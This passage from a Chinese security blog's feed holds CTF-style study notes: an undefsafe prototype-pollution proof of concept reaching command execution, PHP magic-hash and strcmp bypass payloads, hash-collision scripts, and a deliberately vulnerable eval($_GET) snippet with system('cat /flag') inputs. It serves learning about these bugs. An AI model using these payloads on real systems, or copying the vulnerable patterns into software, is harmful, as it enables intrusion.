template-string"><span class="token string">`Example app listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对萌新而言，难就难在调试，代码看不懂，调试也不会调，看不到结果，就更加不会了。</p><p>我在.js文件所在文件夹下创建一个node_modules的文件夹，然后npm install <a href="mailto:undefsafe@2.0.2" target="_blank" rel="noopener">undefsafe@2.0.2</a>，高版本已经修复了，如果默认去安装的话，就会得到高版本的，是无法进行漏洞复现的。</p><p><img src="/2020/05/10/best-nodejs/1.png" alt="js1"></p><p>可以看到自动创建了一个package-lock.json，<a href="mailto:undefsafe@2.0.2" target="_blank" rel="noopener">undefsafe@2.0.2</a>的包也放在了node_modules里面。</p><p><img src="/2020/05/10/best-nodejs/2.png" alt="js2"></p><p>下面写了一个poc，可以看到利用undefsafe进行原型链污染，使得字典commands在遍历的时候最后一个键值成了我们赋的shell语句，从而实现rce。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"undefsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"__proto__.a"</span><span class="token punctuation">;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token string">"type d:\\flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">{</span> exec <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"script-1"</span><span class="token punctuation">:</span> <span class="token string">"dir"</span><span class="token punctuation">,</span>    <span class="token string">"script-2"</span><span class="token punctuation">:</span> <span class="token string">"whoami"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> index <span class="token keyword">in</span> commands<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>stdout<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/10/best-nodejs/3.png" alt="output"></p><h2 id="2-4-参考资料"><a href="#2-4-参考资料" class="headerlink" title="2.4 参考资料"></a><strong>2.4 参考资料</strong></h2><p><strong>1.</strong>   javascript——原型与原型链  <a href="https://www.cnblogs.com/loveyaxin/p/11151586.html" target="_blank" rel="noopener">https://www.cnblogs.com/loveyaxin/p/11151586.html</a></p><p><strong>2.</strong>  js原型链  <a href="https://www.jianshu.com/p/08c07a953fa0" target="_blank" rel="noopener">https://www.jianshu.com/p/08c07a953fa0</a></p><p><strong>3、</strong>javascript原型链污染详解：<a href="https://wulidecade.cn/2019/04/15/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%AF%A6%E8%A7%A3(%E5%90%8E%E6%9C%89%E5%BD%A9%E8%9B%8B)/" target="_blank" rel="noopener">https://wulidecade.cn/2019/04/15/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%AF%A6%E8%A7%A3(%E5%90%8E%E6%9C%89%E5%BD%A9%E8%9B%8B)/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>best_CodeReview</title>
      <link href="/2020/05/09/best-codereview/"/>
      <url>/2020/05/09/best-codereview/</url>
      
        <content type="html"><![CDATA[<h1 id="1-PHP代码审计"><a href="#1-PHP代码审计" class="headerlink" title="1.  PHP代码审计"></a>1.  PHP代码审计</h1><h2 id="1-1-php函数"><a href="#1-1-php函数" class="headerlink" title="1.1  php函数"></a>1.1  php函数</h2><h3 id="1-1-1-md5和sha1"><a href="#1-1-1-md5和sha1" class="headerlink" title="1.1.1  md5和sha1"></a>1.1.1  md5和sha1</h3><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么PHP将会认为他们相同，都是0。（0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，但需要注意的是0e后面的必须都是<strong>数字</strong>。）</p><p>md5或者sha1加密并进行弱类型匹配的时候，就可以利用这个特性进行绕过。常见的payload有：</p><pre><code>MD5类型，进行md5加密QNKCDZO240610708s878926199as155964671as214587387a-----------------------------------------------------------------------------------------sha1类型，进行sha1加密sha1(&#39;aaroZmOk&#39;)  sha1(&#39;aaK1STfY&#39;)sha1(&#39;aaO8zKZF&#39;)sha1(&#39;aa3OFF9m&#39;)</code></pre><p>同时MD5不能处理数组，若有以下判断也可用数组绕过。</p><h4 id="easy-demo"><a href="#easy-demo" class="headerlink" title="easy_demo"></a><strong>easy_demo</strong></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//payload1:  ?a[]=1&amp;b[]=2</span>    <span class="token comment" spellcheck="true">//payload2:  ?a=QNKCDZO&amp;b=240610708</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!=</span><span class="token variable">$b</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="hard-demo0"><a href="#hard-demo0" class="headerlink" title="hard_demo0"></a><strong>hard_demo0</strong></h4><pre><code>需要满足：$md5==md5($md5)0e9453824101</code></pre><h4 id="hard-demo1"><a href="#hard-demo1" class="headerlink" title="hard_demo1"></a><strong>hard_demo1</strong></h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>36d（ctfshow）<a href="https://www.gem-love.com/ctf/2283.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2283.html</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//题目</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>正常爆破：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token string">'0e'</span> <span class="token operator">+</span> i    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>num<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>md5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(md5)</span>    <span class="token keyword">if</span> md5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0e'</span> <span class="token operator">and</span> md5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'success str:{}  md5(str):{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num<span class="token punctuation">,</span> md5<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#得到结果：0e1138100474</span><span class="token comment" spellcheck="true">#  0e9560937882</span><span class="token comment" spellcheck="true">#  0e1883153115</span><span class="token comment" spellcheck="true"># success str:0e1138100474  md5(str):0e779212254407018184727546255414</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>多线程MD5哈希碰撞：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#python2</span><span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> sys<span class="token keyword">import</span> timet <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始计时：'</span><span class="token operator">+</span><span class="token string">'0 min'</span><span class="token punctuation">)</span>CHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token keyword">def</span> <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token operator">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t_now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>t        <span class="token keyword">if</span> <span class="token punctuation">(</span>int<span class="token punctuation">(</span>t_now<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>t_now<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">60</span><span class="token operator">!=</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>            key <span class="token operator">=</span> int<span class="token punctuation">(</span>t_now<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">60</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始计时：'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>t_now<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.0'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' min'</span><span class="token punctuation">)</span>        rnds <span class="token operator">=</span> <span class="token string">'0e'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>        value <span class="token operator">=</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># if value[start: start+str_len] == substr and value[start+str_len:].isdigit():</span>            <span class="token comment" spellcheck="true"># print(rnds)</span>            <span class="token comment" spellcheck="true">#碰撞双md5</span>        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">if</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>start<span class="token punctuation">:</span> start<span class="token operator">+</span>str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr <span class="token operator">and</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>start<span class="token operator">+</span>str_len<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>            <span class="token keyword">print</span> rnds<span class="token operator">+</span> <span class="token string">"=>"</span> <span class="token operator">+</span> value<span class="token operator">+</span><span class="token string">"=>"</span><span class="token operator">+</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">"\n"</span>            stop_event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    start_pos <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>    str_len <span class="token operator">=</span> len<span class="token punctuation">(</span>substr<span class="token punctuation">)</span>    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>                                         stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个脚本增加了计时功能，但每次有两条回显，我也不知道怎么改。并且因为是随机的，所以会存在浪费资源的情况，最好改成8个线程，每个线程负责不同区域的随机。</p><p><img src="/2020/05/09/best-codereview/1.png" alt="hard_demo1"></p><p>但用php计算的话，与python计算的结果又不一样：</p><pre><code>php &gt; print(md5(md5(0e1138100474)));dcfcd07e645d245babe887e5e2daa016</code></pre><p>同时还发现了一个php的特性：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//由于未定义，所以默认都为null，始终success</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="hard-demo2"><a href="#hard-demo2" class="headerlink" title="hard_demo2"></a>hard_demo2</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>双md5加密绕过（这篇文章存在一些错误！！）  <a href="https://blog.csdn.net/baguangman5501/article/details/102031546" target="_blank" rel="noopener">https://blog.csdn.net/baguangman5501/article/details/102031546</a></p><p>直接利用hard_demo1的结果构造payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">//payload:    ?a=QNKCDZO&amp;b=0e9560937882</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"flag{XXXXX}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"wrong!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'wrong!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="hard-demo3"><a href="#hard-demo3" class="headerlink" title="hard_demo3"></a>hard_demo3</h4><p>如果我把条件变的更加苛刻一点：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"flag{XXXXX}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"wrong!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'wrong!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-2-strcmp"><a href="#1-1-2-strcmp" class="headerlink" title="1.1.2  strcmp"></a>1.1.2  strcmp</h3><p>这个漏洞在php版本5.2.17下测试发现已经被官方修补了，现把原理介绍如下</p><pre><code>int strcmp(string $str1, string $str2)</code></pre><p>参数 str1第一个字符串。str2第二个字符串。如果 str1小于str2返回 &lt; 0；如果str1大于str2返回&gt;0；如果两者相等，返回 0。</p><p>当这个函数接受到了不符合的类型，这个函数将发生错误，但是显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了，这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞。</p><p><strong>demo地址</strong>    <a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"flag{xxxxx}"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'No'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-3-eval"><a href="#1-1-3-eval" class="headerlink" title="1.1.3  eval"></a>1.1.3  eval</h3><p>eval函数的输入句尾必须有;，表示一句完整的php语句。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre><code>windows下：?a=system(&#39;type d:\flag&#39;);如果把单引号换成双引号，就错误了。-----------------------------------------------------------------------------------------linux下：?a=system(&quot;cat /flag&quot;);?a=system(&#39;cat /flag&#39;);这两条都可以</code></pre><h3 